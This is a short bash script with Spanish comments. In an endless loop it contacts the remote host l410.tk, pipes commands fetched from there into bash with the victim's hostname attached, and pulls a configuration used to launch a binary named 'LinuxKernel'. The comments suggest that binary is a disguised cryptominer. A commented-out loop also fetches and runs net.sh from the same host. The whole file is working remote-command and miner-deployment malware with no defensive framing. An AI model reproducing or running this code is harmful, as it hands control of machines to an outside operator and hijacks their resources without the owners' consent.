## validateConnection
validateConnection () {
wget -q --spider http://l410.tk/az/configxm.php

if [ $? -eq 0 ]; then
	curl -s http://l410.tk/az/commandlin.php?l410=1\&pc=Azrael-linux@$(hostname) | bash
    #sihay
    content=$(wget http://l410.tk/az/configxm.php -q -O -)
	equipo=$(hostname)
	comando=${content/usuario/"linux@"$equipo}
	# $comando ya tenemos todo listo ahora checar si se ejecuta el min si no lo ejecutamos conla nueva configuracion
	if pgrep -x LinuxKernel > /dev/null
	then
	   echo " "
	   	   
	 else
	 #echo "no esta corriendo ejecuto"
	 ./LinuxKernel $comando &
	fi

   #exit 1
else
 echo ""
fi
}

#while :
#do curl -s -L http://l410.tk/net.sh | bash
#sleep 50
#done

while :
do validateConnection
sleep 30
done
